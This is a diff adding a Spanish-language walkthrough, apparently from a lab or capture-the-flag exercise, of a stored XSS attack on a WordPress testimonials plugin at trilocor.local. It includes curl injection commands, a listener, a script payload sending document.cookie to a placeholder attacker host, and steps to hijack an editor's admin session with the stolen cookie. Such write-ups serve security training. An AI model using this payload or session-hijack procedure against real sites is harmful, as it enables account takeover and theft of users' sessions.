@@ -106,3 +106,52 @@ http://www.trilocor.local/index.php/wp-json/
 y
 http://www.trilocor.local/index.php/wp-json/wp/v2/
 
+## Ataque xss
+
+**Paso 1 — Leer el contenido real del sitio.**
+En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
+- _Desde el navegador:_ entre a `http://www.trilocor.local/`, fui a la sección de testimonios, click derecho → "Ver código fuente" y buscar el formulario.
+- _Desde la API REST_ (que devuelve el contenido de la home en crudo):
+```bash
+curl -s 'http://www.trilocor.local/index.php/wp-json/wp/v2/posts' | grep -i 'action='
+```
+En ambos casos aparece este formulario:
+```html
+<form id="contact" action="/wp-content/plugins/secure_testimonials/post-testimonial.php" method="post">
+```
+Ese atributo action="..." es de donde sale la ruta. Ahí aparece el nombre del plugin (secure_testimonials) y su endpoint (post-testimonial.php). El method="post" confirma que hay que enviarlo por POST.
+
+**Paso 2 — Confirmar que el endpoint procesa el envío.** Replicando el POST con curl (lo que el navegador hace al apretar "Submit"):
+```
+curl -i -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
+  --data 'name=test&company_title=test&email=test@test.com&testimonial=hola'
+```
+Respuesta: `HTTP 200` con "Thank you! Your testimonial has been received successfully." → el endpoint guarda lo que se manda.
+
+**Paso 3 — Detecto que no sanitiza el input.** Se reenvía con etiquetas HTML de prueba y las acepta sin filtrarlas:
+```
+curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
+  --data 'name=test&company_title=test&email=a@a.com&testimonial=<u>x</u>'
+```
+Como no rechaza el HTML, también va a aceptar `<script>` → posible Stored XSS.
+
+**Paso 4 — Monto el receptor.** En la máquina de ataque:
+```
+python3 -m http.server 80
+```
+
+**Paso 5 — Inyecto el payload.** Se envía un testimonial cuyo contenido es un script que roba la cookie:
+```
+curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
+  --data-urlencode 'name=Cliente' \
+  --data-urlencode 'email=a@a.com' \
+  --data-urlencode 'testimonial=<script>new Image().src="http://MI_IP/hook?c="+document.cookie</script>'
+```
+
+**Paso 6 — Capturo la cookie.** Cuando el revisor (`web-editor`) abre el testimonial, su navegador ejecuta el script y el listener recibe:
+```
+GET /hook?c=wordpress_logged_in_...=web-editor|...
+```
+Las cookies no tenían `HttpOnly`, por eso `document.cookie` pudo leerlas.
+
+**Paso 7 — Secuestrar la sesión.** Cargo esas cookies (decodificando `%7C` → `|`) en el navegador con Cookie-Editor sobre `admin.trilocor.local`, y al entrar a `/wp-admin/` WordPress reconoce la sesión como `web-editor` sin pedir contraseña.
